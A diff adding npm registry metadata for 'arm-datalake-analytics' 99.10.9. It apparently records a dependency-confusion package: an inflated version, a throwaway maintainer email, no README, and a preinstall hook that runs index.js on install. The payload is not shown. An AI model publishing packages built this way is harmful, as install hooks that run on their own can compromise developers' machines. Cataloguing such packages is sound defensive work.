@@ -1,0 +1,62 @@
+{
+    "_id": "arm-datalake-analytics",
+    "name": "arm-datalake-analytics",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-datalake-analytics",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-datalake-analytics@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-voZVP/YtsRNpiWh+o++UpOiLQYB2v4OLfLMwjYmQpeaJIJJ8zvH5MNcUjFfPwfWyNWc4R+2pr35/EjMt+1f2kw==",
+                "shasum": "8f227f5d3f8b692e1b853eef1ffd589e6391d915",
+                "tarball": "https://registry.npmjs.org/arm-datalake-analytics/-/arm-datalake-analytics-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5074,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNxjUACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrOUA//Y551j6fgcjHXE6FkM59uNsyT6R6Zuukua1XDiA7UPWQLp+lr\r\nmG4rAG83M/PMh0eCiTWR6ndMLEJkAZd0OLrDhimTAi9sHTT1YHvqH29+REVh\r\n/nu/4542DetDpB0/EkxAcrypw6RQ+2IVsD82/a5dvjSRLYAD17Y48v1eqjqD\r\n/Gv+ENW16cXMHjnEztZp0qYodWEiDdRlfFvFWqqfQDr+kB9DcL+TKksdCRC2\r\ncLWBgA8wl9Wc6tPcAMbiTRBrj0Tc9JK5k0p/O7DeO6Wlo72JkaoeNGIo/lEF\r\nOG0d8lwPmqPe04NFOKcWwpIdRp/7dfDVXBVghWz9faYgJAxMnwzNoDgxKxHN\r\nOsuraLPgddWXQ0v0BzCaoVxrBG+/kHf4StGvg4HVPEQ9GLwmWWZjQnhqh/Ex\r\nZtcAzKWjyj6qpci+sra19FOChRGJXjSeF8ptj7zpppCgxzXd7Y6fShk0vwkv\r\nKo0ELrcYe0Hn1l+oZ127wvOhIvfld+tQn7HG//pBs+PDhcW8IlH+DN9Nrlcf\r\naY6Kfjo6inDb/xPWjrvn6aoXC0soWbiDaiLrQopyz2bcpcDBe3Xp2wkWGTw6\r\nK/bXZXuXkrKoWiBwzR3y2t/gIQeg34aLUSb+J543M0RXzrjJyMyxGI5X3yAR\r\n6W98HW7RF+VALj4gBz5ZGCuD5qVpYC9LWNY=\r\n=09du\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "cv5ljnf2",
+                "email": "cv5ljnf2@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "cv5ljnf2",
+                    "email": "cv5ljnf2@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-datalake-analytics_99.10.9_1647778004444_0.08109882619538333"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T12:06:44.443Z",
+        "99.10.9": "2022-03-20T12:06:44.577Z",
+        "modified": "2022-03-20T12:06:44.673Z"
+    },
+    "maintainers": [
+        {
+            "name": "cv5ljnf2",
+            "email": "cv5ljnf2@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
